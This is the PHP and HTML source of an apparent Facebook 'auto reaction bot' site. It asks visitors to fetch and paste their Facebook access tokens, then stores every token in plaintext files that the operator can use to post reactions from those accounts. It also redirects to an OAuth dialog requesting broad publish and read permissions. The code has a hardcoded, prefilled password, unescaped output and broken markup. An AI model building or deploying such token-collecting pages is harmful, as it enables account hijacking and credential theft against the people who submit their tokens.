﻿﻿﻿﻿<br>
<h1><center><script src="Rameezbot.js"></script><h1>
</center>
<center><div id ="example1"></div></center><br>
<?php 
session_start();
error_reporting(0);




$site_title = "• MOUZAM ALI REACTION BOT •";




// using banned in role will show user that he is banned when he try to login . 
$users = array(
               "react" => array("name" => "buddy", "role"=> "admin"),
               "react" => array("name" => "buddy", "role"=> "admin"),
               "react" => array("name" => "buddy", "role"=> "guest"),
               "react" => array("name" => "buddy", "role"=> "guest")
               );




if(isset($_SESSION['logged']) && !isset($users[$_SESSION['password']]) || $users[$_SESSION['password']]['role'] == 'banned'){
      unset($_SESSION['logged']);
      unset($_SESSION['password']);
      unset($_SESSION['username']);
}




if(!isset($_SESSION['logged']) || $_SESSION['logged'] ==  false){
        $showlogin = true;
        $loginerror = "";
        
   if(isset($_POST['password'])){




      $password = $_POST['password'];




    if(!empty($password)){




      if(isset($users[$password])){
        
         if($users[$password]['role'] !== 'banned'){
                      $_SESSION['logged'] = true;
                      $_SESSION['password'] = $password;
                      $_SESSION['username'] = $users[$password]['name'];
            $showlogin = false;
          }else{
                   if(isset($users[$password]['msg']) && !empty($users[$password]['msg'])){
              $loginerror =  $users[$password]['msg'];
                   }else{
              $loginerror = "You are banned from using this bot! Get out of here!";
            }
          }
      }else{
                 $loginerror = "Wrong Password!";
      }




     }else{
             $loginerror = "Please enter Password!";
     }
  }
}




 ?>












<title>• MOUZAM ALI REACTION SITE •</title> 
<link href="http://pathanu.78.lt/reaction/css/style.css" rel="stylesheet" type="text/css">
<href="http://pathanu.78.It/reaction/css/style_2.css" rel="stylesheet" type="text/css" media="all">

<script src="//code.jquery.com/jquery.min.js"></script>
<div id="snowflakeContainer">
            <p class="snowflake">MOUZAM ALI</p>
</div>
<script src="fallingsnow_v6.js"></script>

<?php error_reporting(0);
$bot=new bot();
class bot{ 




public function getGr($as,$bs){
$ar=array(                                                         
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);




return $im.$as.$bs;
}




public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $cokis[]=$b.'='.$c;
}
$true='?'.implode('&',$cokis);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}




private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by LOvely Buddy',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}




public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('cokis')){
        mkdir('cokis');
}
if($bb){
$blue=fopen('cokis/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);




echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! Buddy")</script>';
}else{
        if($z){
if(file_exists('cokis/'.$id)){
$file=file_get_contents('cokis/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('cokis/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('cokis/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('cokis/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !! Good Luck !! Buddy")</script>';}}
}




public function lOgbot($d){
        unlink('cokis/'.$d);
        unset($_SESSION[key]);




echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';




        $this->atas();
        $this->home();
        $this->bwh();
}




public function cek($tok,$id,$nm){
$if=file_get_contents('cokis/'.$id);
$if=explode('*',$if);
echo'
<center>
<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link"><font color="white">Setting BOtTed by '.$nm.'</a></h3>
<ul>
<li>
Welcome Back : <font color="White">'.$nm.'</font></li>
<li>
<a href="http://www.facebook.com/'.$id.'"><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;" alt="'.$nm.'"/></a></li>
<li>
<form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">LOgout BOT</button> </a><br>
<li>
<form action="index.php" method="post">
<font color="red">Auto Reaction Has Been Activated</li>
<li>

<div id="top-content">
<div id="search-form">
</div></div></div>';




$this->membEr();
}




public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);




$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);




$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);




echo'
<div id="header">
<h1 class="heading">
<center><a target="_top" href="http://www.flamingtext.com/" ><img src="http://blog.flamingtext.com/blog/2017/03/29/flamingtext_com_1490788108_286730351.png" border="0" alt="Logo Design by FlamingText.com" title="Logo Design by FlamingText.com"></a></center>



</h1>
<h2 class="description">
</h2></div>';
} 




public function home(){
echo'
<div id="content">
<div class="post">
<div class="post-meta">
<h2 class="title">
</h2>
</div>
<div class="post-content">
<span>




<span>
</span>
</div>
<div class="post-meta2">
</div>
</div>
</div>';
}








public function showlogin(){
                 echo '<div id="bottom-content">
<div id="navigation-menu">
<h3><a name="navigation-name" class="no-link">CLICK HERE TO LOGIN</a></h3>
<ul id="search-form">
  
  <form action="index.php" method="post">
  <li><div class="login-error">'.$GLOBALS["loginerror"].'</div></li>
   <li><label class="label-password">Password&nbsp;
  <br>
  </center>
   </label><input class="inp-text" type="password" value="react" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="password"></li>
   <center>
    <button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">♥ LOGIN NOW ♥</button> </a><br>
  </form>
</ul></div></div>';
        }




















public function bwh() {
    
 if(isset($GLOBALS['showlogin']) && $GLOBALS['showlogin'] == true){
          $this->showlogin();
          $this->membEr();
          return;
 }
         echo '<div id="bottom-content">
<div id="navigation-menu">
<h3></h3>
<b>
</span>
</div></center><br>
<center>
<ul>
<a
<a href="http://zainbhfk.beget.tech/" target="_blank">
<button id="submit" class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;"><font size="6" color="red">GET IPHONE TOKEN</font></button> </a><br>
<div style="border-top: 1px #ccc solid; margin-top: 10px;"></div></br>
<font color="white" size="5">❤ SUBMIT YOUR ACCESS USE IPHONE TOKEN ❤;
</font>
<br>
<div id="top-content">
<div id="search-form">
<center>
<form action="index.php" method="post">
<br>
<input class="inp-text" type="text" style="height:35px;width:60%;border-radius:15px;border:1px solid white;background: none;color:white;" name="token">
<center>
<button id="submit"  class="btn btn-sm btn-primary"style="border: 1px solid white;color: #fff;border-radius: 48px;padding: 15px;font-size: 12px;font-weight: bold;margin-left: -3px;margin-top: 5px; margin-bottom: 10px;background-color: white;color:white;background: none;">Save</button> </a><br></form></div></div></div>';



$this->membEr();
}




public function membEr(){
        if(!is_dir('cokis')){
        mkdir('cokis');
}
$up=opendir('cokis');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }




echo'
<center>
            <h4></h4></font></h5></p>
            </ol>
            <div class="messages-push"></div>
        </div>
    <div class="footer">
<p><h4></h4></font></h5></p>
       
    </div>
<p><h4></h4></font></h5></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<center>
<div id="footer">
<font size="10" color="white">
FANS: <font size="10" color="white">'.count($user).'</font>
</div>';
}











public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}








}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('cokis/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Buddy Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('cokis/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Buddy Token invalid")</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
</div>
</div>
</div>
</script>
<p><h4> <font color="white";>--- Click Play Button FOr SOng  ---</h4></font></h5></p>
<center><audio controls autoplay>
  <source src="http://2016a.downloadming1.com/punjabi%20mp3/Havana%20-%20Kamal%20Raja%20(2016)/01%20-%20Havana%20(320%20Kbps)%20-%20DownloadMing.SE.mp3 " type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
</body>
<SCRIPT LANGUAGE="JavaScript">
var message="YA SCRIPT COPY TARA PAPA B NAI KR SKTA DISBALED KYA HWA HA‚  ";
///////////////////////////////////
function clickIE() {if (document.all) {alert(message);return false;}}
function clickNS(e) {if 
(document.layers||(document.getElementById&&!document.all)) {
if (e.which==2||e.which==3) {alert(message);return false;}}}
if (document.layers) 
{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}

document.oncontextmenu=new Function("return false")
// --> 
</script>